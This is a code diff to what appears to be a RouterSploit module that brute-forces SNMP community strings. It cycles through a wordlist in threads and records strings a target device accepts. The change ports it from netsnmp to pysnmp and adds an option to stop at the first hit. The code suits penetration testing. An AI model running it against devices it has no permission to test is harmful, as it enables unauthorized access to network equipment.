@@ -1,5 +1,5 @@
 import threading
-import netsnmp
+from pysnmp.entity.rfc3413.oneliner import cmdgen
 
 from routersploit import (
     exploits,
@@ -29,7 +29,7 @@ class Exploit(exploits.Exploit):
     threads = exploits.Option(8, 'Number of threads')
     snmp = exploits.Option(wordlists.snmp, 'Community string or file with community strings (file://)')
     verbosity = exploits.Option('yes', 'Display authentication attempts')
-
+    exit_on_success = exploits.Option('yes', 'Exit on first valid community string')
     strings = []
 
     def run(self):
@@ -59,23 +59,27 @@ class Exploit(exploits.Exploit):
     def target_function(self, running, data):
         module_verbosity = boolify(self.verbosity)
         name = threading.current_thread().name
-        address = "{}:{}".format(self.target, self.port)
 
         print_status(name, 'thread is starting...', verbose=module_verbosity)
 
+        cmdGen = cmdgen.CommandGenerator()
         while running.is_set():
             try:
                 string = data.next().strip()
 
-                bindvariable = netsnmp.Varbind(".1.3.6.1.2.1.1.1.0")
-                res = netsnmp.snmpget(bindvariable, Version=1, DestHost=address, Community=string)
+                errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(
+                    cmdgen.CommunityData(string),
+                    cmdgen.UdpTransportTarget((self.target, int(self.port))),
+                    '1.3.6.1.2.1.1.1.0',
+                )
 
-                if res[0] is not None:
-                    running.clear()
+                if errorIndication or errorStatus:
+                    print_error("Target: {}:{} {}: Invalid community string - String: '{}'".format(self.target, self.port, name, string), verbose=module_verbosity)
+                else:
+                    if boolify(self.exit_on_success):
+                        running.clear()
                     print_success("Target: {}:{} {}: Valid community string found - String: '{}'".format(self.target, self.port, name, string), verbose=module_verbosity)
                     self.strings.append((self.target, self.port, string))
-                else:
-                    print_error("Target: {}:{} {}: Invalid community string - String: '{}'".format(self.target, self.port, name, string), verbose=module_verbosity)
 
             except StopIteration:
                 break
